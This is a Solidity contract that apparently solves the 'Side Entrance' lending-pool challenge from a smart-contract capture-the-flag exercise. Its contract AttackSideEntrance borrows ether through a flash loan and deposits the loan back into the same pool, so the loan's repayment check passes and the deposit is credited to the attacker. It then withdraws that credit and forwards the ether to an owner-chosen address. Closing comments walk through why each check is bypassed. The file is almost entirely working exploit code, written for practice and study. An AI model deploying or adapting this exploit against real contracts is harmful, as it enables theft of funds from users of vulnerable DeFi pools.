// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { SideEntranceLenderPool } from "./SideEntranceLenderPool.sol";

contract AttackSideEntrance {
    SideEntranceLenderPool pool;
    address owner;
    uint256 public funds;

    event FundsAdded(uint256 amount);

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
        owner = msg.sender;
        funds = 0;
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    function start(uint256 amount) public {
        pool.flashLoan(amount);
    }

    function steal() public {
        require(msg.sender == owner);
        pool.withdraw();
    }

    function withdraw(address _to) public {
        require(msg.sender == owner);
        (bool success,) = _to.call{value: funds}("");
        require(success, "withdraw failed");
    }

    receive() external payable {
        funds = funds + msg.value;
    }
}

// could we use an implementation of IFlash... to call withdraw w/ msg.sender eq pool ?
    // I don't think so, we wouldn't be able to pass the require statement on L35
// could we call deposit with the flashLoan amount?
    // flashLoan(uint256 amount = 1000)
        // uint256 balanceBefore = 1000
        // require balanceBefore gte amount PASSES
        // IFlash...(msg.sender).execute{value: amount}();
            // here we call deposit{value: amount}()
                // pool get's it's eth back and we increment
                    // balances[msg.sender] += amount
        // require address(this).balance gte balanceBefore PASSES
    // call withdraw
